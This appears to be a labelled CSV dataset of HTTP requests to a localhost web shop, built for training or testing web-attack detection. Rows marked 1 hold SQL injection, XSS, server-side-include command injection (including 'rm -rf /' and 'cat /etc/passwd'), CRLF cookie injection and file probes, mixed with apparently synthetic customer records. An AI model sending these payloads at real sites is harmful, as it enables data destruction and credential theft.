query,label
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39%2F&cantidad=82&B1=A%F1adir+al+carrito,1
modo=registro&login=vladamir&password=l-e3a06l&nombre=Josu%E9&apellidos=Cervera+B%E1rcena&email=charlebois3%40nanotecnologo.np&dni=52530900G&direccion=Calle+Ponte+Vella+S%2FN%2C+13E&ciudad=Villarejo+de+Fuentes&cp=29491&provincia=Badajoz&ntc=5250590089534559&B1=Registrar,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29 HTTP/1.1,1
modo=registro&login=auria&password=perero&nombre=Ubaldino&apellidos=Guillem+Paip%F3&email=dante%40opticaweb.mobi&dni=89687602E&direccion=C%2F+San+Antonio+65+12%3FA&ciudad=Nieva+de+Cameros&cp=03440&provincia=Palencia&ntc=3055509843252102&B1=Registrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
modoA=registro&login=bradee&password=ran7%F3n&nombre=Jairo&apellidos=Uruburu+Ayensa&email=coffer%40soyvalenciano.bu&dni=19782082N&direccion=Pe%F1a+Dorada+87%2C+1%3FF&ciudad=Valfarta&cp=09660&provincia=Girona&ntc=1025019984542981&B1=Registrar,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=maggee&password=m1n*6848&nombre=Mar%EDa+Bel%E9n&apellidos=Jorge+Paquirachi&email=bartlett%40waterflyesp.eh&dni=82474321R&direccion=Calle+Silvestre+Peromarta+60%2C+&ciudad=Santa+Mar%EDa+de+las+Hoyas&cp=26213&provincia=Girona&ntc=6708008477094577&B1=Registrar HTTP/1.1,0
modo=insertar&precio=5130&B1=Confirmar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=robena1&password=improvisaci%F3n&nombre=Reinoldo&apellidos=Gelabert&email=oland5%40schnaps.com.by&dni=51756068L&direccion=C%2F+Santa+Escolastica+178%2C+&ciudad=Quintanilla+de+Arriba&cp=35543%27+DELETE+FROM+USERS&provincia=Huesca&ntc=7852557135021483&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=austen&password=menegilda&nombre=Marcia&apellidos=Castelltort+Trullol&email=%7C&dni=74819294H&direccion=Guadalete+90%2C+&ciudad=Porto&cp=10616&provincia=Segovia&ntc=2214886368001325&B1=Registrar HTTP/1.1,1
modo=insertar&precio=3146&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
modo=registro&login=antai&password=3a2rimo19&nombre=Pangui&apellidos=Arbel%E1ez+Grippo&email=alzucaray-randol%40juanpolo.dz&dni=21335513T&direccion=Calle+Benito+Monfort+60%2C+&ciudad=Ba%F1os+de+Ebro%2FMa%F1ueta&cp=09140&provincia=Pontevedra&ntc=8995996565558024&B1=Registrar,0
http://localhost:8080/tienda1/global/creditos.jsp/asf-logo-wide.java HTTP/1.1,1
modo=entrar&login=corvo&pwd=4mbel0c11362%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=730&B1=Confirmar HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=shoouyu&pwdA=06434Q969o&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
modo=registro&login=siomalas&password=s18i7re&nombre=Idalina&apellidos=Carcanoux&email=fujioka%40importaproductosespa%F1oles.in&dni=06317568C&direccion=Victor+Zurita+Soler%2C+8+9%3FB&ciudad=Puebla+de+Cazalla%2C+La&cp=49220&provincia=Ja%E9n&ntc=8222633485152757&B1=Registrar,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
errorMsgA=Credenciales+incorrectas,1
modo=insertar&precio=2461&B1=Confirmar,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
B2=Vaciar+carrito,1
http://localhost:8080/tienda1/imagenes/logo.gif/asf-logo-wide HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=6r6s1arr%E17&remember=on&B1=Entrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=57&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mitsuter&password=EXTE69a1i29&nombre=Remberta&apellidos=Belver&email=boutigny%40maxtienda.mx&dni=01449063V&direccion=Calle+Ramon+Mari%F1o+Mirazo+46+&ciudad=Hinojosa%2C+La&cp=13591&provincia=Zaragoza&ntc=1258990500975774&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gdowik2&password=29%3Fem2ti3a&nombre=Grecia&apellidos=Ar%E1n+Pola&email=fravel%40filtraciondehumos.sz&dni=48171319G&direccion=El+Vito%2C+90+&ciudad=Ampolla%2C+L%27&cp=50100&provincia=Castell%F3n&ntc=1798713909636768&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/1.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css.Bak HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=108&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%2B HTTP/1.1,1
http://localhost:8080~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=6494&B1=Confirmar HTTP/1.1,1
modo=registro&login=montijo&passwordA=mane79&nombre=Lihuen&apellidos=Bibiloni+Urdi&email=brion%40baybay.gi&dni=00508069E&direccion=Gerona+89+&ciudad=Olocau+del+Rey&cp=16122&provincia=Valladolid&ntc=2304911329453006&B1=Registrar,1
http://localhost:8080/WebSphereSamples/ HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=celso&pwd=desvarar&remember=on&B1=Entrar%22+AND+%221%22%3D%221 HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=barnhous&pwd=ip50&remember=on&B1=Entrar HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp/4861362529278789730.java HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,0
modo=entrar&login=ne-regio&pwd=sabio&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=62&B1=A%F1adir+al+carrito HTTP/1.1,0
id=2,0
http://localhost:8080/tienda1/publico/asf-logo-wide.gif HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27INJECTED_PARAM HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=willy&password=c53p7t25064&nombre=Aidano&apellidos=Pujos+Janeiro&email=eberle%40baybay.tg&dni=85025185G&direccion=De+La+Vega+4%2C+&ciudad=Casasimarro&cp=21340&provincia=A+Coru%F1abob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&ntc=7642131917731646&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=presEn%2C%2F%2CcIaR&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provincia=Badajoz&ntc=4288323841686638&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%3Fdenise&pwd=pLaSMaDoR&remember=on&B1=Entrar HTTP/1.1,1
B2=Vaciar+carrito%253F,1
id=2&nombre=Queso+Manchego&precio=100&cantidad=21&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%3C%21--%23exec+cmd%3D%22rm+-rf+%2F%3Bcat+%2Fetc%2Fpasswd%22+--%3E HTTP/1.1,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&login=widuch&password=o7TOp%E9dIca&nombre=Belindo&apellidos=Calet&email=gassman%40itrends.gs&dni=54927886E&direccion=Memorial+Nu%F1ez+Blanca+193%2C+&ciudad=Madridanos&cp=37060&provincia=Teruel&ntc=0916374019101201&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=cecile&password=hervidor&nombre=Ideimar&apellidos=Selles+Tanari&email=dac%40eonon.com.cy&dni=98058748L&direccion=C%2F+Alcazalquivir+S%2FN+&ciudad=Galbarros&cp=37718&provincia=Zaragoza&ntc=3153195738365975&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
modo=entrar&login=shay-pin&pwd=pajO&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Queso+Manchego&precio=39%2F&cantidad=91&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/samples/isapi/favlist.htm HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=100&cantidad=75&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=audrye&pwd=ech5d7&remember=off&B1=Entrar HTTP/1.1,0
modo=entrar&login=forgeron&pwd=goz6618l9s&remember=on&B1A=Entrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hendren&password=veinten6o&nombre=N%E9stor&apellidos=Pont&email=burkley_mature%40lunch.com.jm&dni=0BB8871667S&direccion=C%2F+Girona+S%2FN+&ciudad=Pola+de+Gord%F3n%2C+La&cp=23100&provincia=%C1vila&ntc=3553885634703680&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235 HTTP/1.1,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heinonen&pwd=%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&remember=on&B1=Entrar HTTP/1.1,1
modo=registro&login=langlois&password=rec73210a&nombre=Sant%EDn&apellidos=Blancas+Sol%F3rzano&email=kleeb%40ringringcargo.kp&dni=72097919A&direccion=Pl.+Constitucion%2C+98%2C+&ciudad=Cabra&cp=46469&provinciaA=Valencia&ntc=5513132638351756&B1=Registrar,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
modo=insertar&precio=973&B1=Confirmar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,0
http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Jam%F3n+Ib%E9rico&precio=85&cantidad=34&B1=A%F1adir+al+carrito HTTP/1.1,1
modo=registro&login=wun&password=intercesoriamente&nombre=Betty&apellidos=Tejo&email=katcher%40tabernarinconete.nr&dni=45295566X&direccion=C%2F+Errementariena+31%2C+&ciudad=Tord%F3mar&cp=25471&provincia=Burgos&ntc=6590914640490551&B1=Registrar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mylo&password=so3pa&nombre=Lienhard&apellidos=Pedragosa+Gasc%F3&email=chatinover%40prestoesesto.zm&dni=22456953Y&direccion=Fideus%2C+75+&ciudad=Usagre&cpA=08281&provincia=Badajoz&ntc=6905475964358006&B1=Registrar HTTP/1.1,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg/asf-logo-wide HTTP/1.1,1
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg HTTP/1.1,0
http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gould&password=haBLisT%E1N&nombre=Gina&apellidos=Marmolejos&email=tindall-bourne%40pintandomucho.cg&dni=06327548H&direccion=Codigo+Postal+Para+Tele+5%2C+63+13G&ciudad=Cabanelles&cp=05230&provincia=Ciudad+Real&ntc=4108422495216222&B1=Registrar HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1 HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
modo=registro&login=harshad&password=czarevitz&nombre=L%EDa&apellidos=Bra%F1a&email=tsangas4%4016horas.il&dni=88918773Z&direccion=Calle+Minerva+66+12%3FC&ciudad=Luquin&cp=22532&provincia=Almer%EDa&ntc=8747300653660135&B1=Registrar,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,0
http://localhost:8080/6909030637832563290.jsp.INC HTTP/1.1,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=moyce&password=antepuesto&nombre=Alberde&apellidos=Fidalgo&email=pochon%40thw-adm.zm&dni=52825918R&direccion=Pico+Clavero+S%2FN%2C+&ciudad=San+Silvestre+de+Guzm%E1n&cp=09390&provinciaA=Alicante&ntc=6031155114009786&B1=Registrar HTTP/1.1,1
errorMsg=Credenciales+incorrectas%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6090&B1=Confirmar%2F HTTP/1.1,1
modo=insertar&precio=4509&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=19&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=joelynn&password=%2Bdelaxar&nombre=Fabricia&apellidos=Matsumiya+Stuyck&email=langlois_benavente%40sutelefono.mg&dni=67094993Z&direccion=Calle+Hernandez+Iglesias%2C+160%2C+&ciudad=Bularros&cp=34468&provincia=Salamanca&ntc=2857564208258288&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,0
modo=registro&login=mallorie&password=ha6agar&nombre=Vinicio&apellidos=Espinoza+Blancarte&email=fischetti.bacall%40players.com.gr&dni=66376502C&direccion=Germanies+18%2C+&ciudad=Itrabo&cp=46660&provincia=Asturias&ntc=2812685253359971&B1=Registrar,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=853&B1=Pasar+por+caja HTTP/1.1,1
B2=Vaciar+carrito,0
id=3&nombre=Queso+Manchego&precio=100%2F&cantidad=86&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1111&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas%27+DELETE+FROM+USERS HTTP/1.1,1
modo=registro&login=jiann&password=freno&nombre=Raifroid&apellidos=Sol%E1+Portillo&email=nererova%40camilafansite.by&dni=41955080K&direccion=C%2F+Fusta+40+11-F&ciudad=San+Pablo+de+los+Montes&cp=49333&provincia=Burgos&ntc=%4040&B1=Registrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=linnell&password=9OAUtoRa&nombre=Orieta&apellidos=Coch+Soto&email=zilzer%40foreignoffice.fo&dni=75022145D&direccion=C%2F+Gomera+148+3%3FE&ciudad=Cabolafuente&cp=45280&provincia=Tarragona&ntc=3549373062406547&B1=Registrar HTTP/1.1,0
errorMsgA=Credenciales+incorrectas,1
modo=registro&login=philips&password=balconaje&nombre=Hansel&apellidos=Ponseti+Vilarrasa&email=zonis-paola%40interanuncios.hk&dni=52864416C&direccion=Calle+El+Labrador+S%2FN+13C&ciudad=San+Isidro&cpA=04868&provincia=Cuenca&ntc=1106332242886154&B1=Registrar,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100&cantidad=40&B1=A%F1adir+al+carrito HTTP/1.1,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
id=1&nombre=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&precio=100&cantidad=37&B1=A%F1adir+al+carrito,1
modo=insertar&precio=5022&B1A=Confirmar,1
id=1&nombre=Vino+Rioja&precio=39&cantidad=65&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,0
modo=insertar&precio=9740&B1=Confirmar,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=beninger&password=3A869ono&nombre=Christian&apellidos=Potel+Ivars&email=obolensky%40etnics.hr&dni=34578974S&direccion=Glorieta+Valle+De+Oro%2C+9+10A&ciudad=Olivares&cp=17179&provincia=Zamora&ntc=0891410815966655&B1=Registrar HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=munaz&password=s2ld54i5a&nombreA=Zulma&apellidos=Llombart&email=strimpell%40deuxmanagement.sn&dni=54841138F&direccion=Sofia%2C+60%2C+3%3FB&ciudad=Finestrat&cp=01427&provincia=Granada&ntc=3222655347075896&B1=Registrar HTTP/1.1,1
errorMsg=Credenciales+incorrectas,0
modo=registro&login=austin&password=va%ED6A&nombre=Dami%E1n&apellidos=Haddock&email=ryder%40mataluenga.zm&dni=12773567B&direccion=Oasis%2C+89+&ciudad=Y%E9meda&cp=42181&provincia=A+Coru%F1a%257C&ntc=1457291251258810&B1=Registrar,1
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1.inc HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,1
modo=insertar&precio=9682&B1A=Confirmar,1
modo=insertar&precio=4872&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1.Old HTTP/1.1,1
modo=registro&login=j*%27ai&password=zullarse&nombre=Jos%E9+Mar%EDa&apellidos=Rodrigo+Ambr%F3s&email=leibman%40softstylestudio.be&dni=90993097Z&direccion=Urbanizacion+Residencial+Ronda+36+9%3FB&ciudad=Riells+i+Viabrea&cp=42150&provincia=Teruel&ntc=9974355200418178&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8233&B1=Pasar+por+caja HTTP/1.1,0
http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,0
http://localhost:8080/tienda1/publico/vaciar.jsp/4861362529278789730 HTTP/1.1,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9491&B1=Pasar+por+caja HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/scripts/tools/drvrs.exe HTTP/1.1,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+AND+%271%27%3D%271 HTTP/1.1,1
http://localhost:8080/tienda1/miembros/salir.jsp~ HTTP/1.1,1
http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
id=1&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=84&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,0
http://localhost:8080/tienda1/index.jsp HTTP/1.1,0
B2=Vaciar+carrito,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=916&B1=Pasar+por+caja%2F HTTP/1.1,1
B2=Vaciar+carrito,0
